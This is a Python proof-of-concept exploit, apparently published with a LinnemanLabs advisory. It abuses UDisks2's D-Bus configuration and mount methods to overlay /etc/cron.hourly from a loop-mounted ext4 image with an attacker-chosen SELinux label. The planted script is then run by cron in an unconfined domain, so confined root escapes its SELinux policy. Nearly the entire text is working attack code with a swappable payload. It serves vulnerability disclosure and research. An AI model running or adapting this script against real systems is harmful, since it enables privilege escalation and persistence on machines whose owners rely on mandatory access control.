#!/usr/bin/env python3
#
# LinnemanLabs - UDisks2 fstab-overlay PoC (cron.hourly)
#
# https://linnemanlabs.com/posts/confined-root-is-still-root/
# https://github.com/linnemanlabs/advisories/
#
# UDisks2 forces nosuid,nodev on a normal Filesystem.Mount (into /run/media). AddConfiguration() will
# write an /etc/fstab entry for us, Mount() honors any mountpoint, any opts (suid, context=, ...).
# Gated only by polkit, self-passed by uid-0. See post for details on reach to the D-Bus interface.
#
# Self-contained: UDisks stages its own loop+ext4 (dd is bin_t, losetup/mkfs/udisksctl are
# fsadm_exec_t/devicekit_exec_t = not exec'able from a confined domain).
#
# This PoC overlays /etc/cron.hourly with a run-parts script. Two fstab cycles, because the mount
# needs attacker opts both times:
#   mount rw under our own writable label to drop the payload
#   re-mount over /etc/cron.hourly as bin_t. context=bin_t (the label for cron.hourly executables)
#   run-parts execs as system_cronjob_t which is a member of unconfined_domain_type
#
# RemoveConfigurationItem after each mount: PoC writes to /etc/fstab, and a leftover entry pointing
# at a dead loop device breaks the next run (the mount itself persists after the entry is removed).
#
# Make sure you set STATE and PRELABEL for the domain you are operating in.
#
import os, sys, dbus
def log(m): print(m, flush=True)
# set to writable directory from your domain. used for staging the image/payload
STATE = '/var/lib/blueooth'
# set to label your domain can open/write, used for staging the image/payload
PRELABEL = 'system_u:object_r:bluetooth_var_lib_t:s0'
# the payload: a run-parts script for cron.hourly
# PAYLOAD = '#!/bin/sh\nlogger -t ud_poc "udisks cron.hourly exec ctx=$(id -Z) uid=$(id -u)"\n'
PAYLOAD = '#!/bin/sh\n{ id; grep ^Cap /proc/self/status; } > /tmp/udisks.out\n'

UD   = 'org.freedesktop.UDisks2'
IMG  = '/var/lib/bluetooth/udisks_poc.img'
MP   = sys.argv[1] if len(sys.argv) > 1 else '/etc/cron.hourly'
CTX  = sys.argv[2] if len(sys.argv) > 2 else 'system_u:object_r:bin_t:s0'
bus = dbus.SystemBus()

def ay(s):
    return dbus.Array([dbus.Byte(x) for x in (s.encode() + b'\x00')], signature='y')

# stage loop + ext4 via UDisks
mgr = dbus.Interface(bus.get_object(UD, '/org/freedesktop/UDisks2/Manager', introspect=False), UD + '.Manager')
os.system('dd if=/dev/zero of=%s bs=1M count=32 2>/dev/null' % IMG)
fd = os.open(IMG, os.O_RDWR)
loop = mgr.LoopSetup(dbus.types.UnixFd(fd), dbus.Dictionary({}, signature='sv')); os.close(fd)
dev = '/dev/' + str(loop).split('/')[-1]
blk = dbus.Interface(bus.get_object(UD, loop, introspect=False), UD + '.Block')
blk.Format('ext4', dbus.Dictionary({}, signature='sv'))
fs = dbus.Interface(bus.get_object(UD, loop, introspect=False), UD + '.Filesystem')
log('[+] staged %s (ext4) via UDisks' % dev)

def fstab(dir_, opts):
    # a ('fstab', a{sv}) configuration item for our device
    return dbus.Struct((dbus.String('fstab'), dbus.Dictionary({
        'fsname': ay(dev), 'dir': ay(dir_), 'type': ay('ext4'), 'opts': ay(opts),
        'freq': dbus.Int32(0), 'passno': dbus.Int32(0)}, signature='sv')), signature='(sa{sv})')

# fstab entry with our writable label -> Mount -> drop the payload -> Unmount -> remove entry
prep = fstab('/mnt/udprep', 'context=' + PRELABEL)
blk.AddConfigurationItem(prep, dbus.Dictionary({}, signature='sv'))
fs.Mount(dbus.Dictionary({}, signature='sv'))
open('/mnt/udprep/0ud_poc', 'w').write(PAYLOAD); os.chmod('/mnt/udprep/0ud_poc', 0o755)
fs.Unmount(dbus.Dictionary({}, signature='sv'))
blk.RemoveConfigurationItem(prep, dbus.Dictionary({}, signature='sv'))
log('[+] wrote run-parts payload onto the image')

# fstab entry for the target -> Mount honors it: any dir, any opts, no forced nosuid
ov = fstab(MP, 'context=' + CTX  + ',noauto,nofail')
blk.AddConfigurationItem(ov, dbus.Dictionary({}, signature='sv'))
mp = fs.Mount(dbus.Dictionary({}, signature='sv'))
# fstab entry persists, loop device doesnt, clean the fstab line
blk.RemoveConfigurationItem(ov, dbus.Dictionary({}, signature='sv'))
log('[+] cleaned entry from fstab')
log('[+] UDisks overlaid %s (context=%s) -> %s' % (MP, CTX, mp))
log('[*] run-parts %s runs 0ud_poc hourly as system_cronjob_t -> journalctl -t ud_poc' % MP)
log('[*] cleanup (root): umount %s ; losetup -d %s ; rm %s' % (MP, dev, IMG))
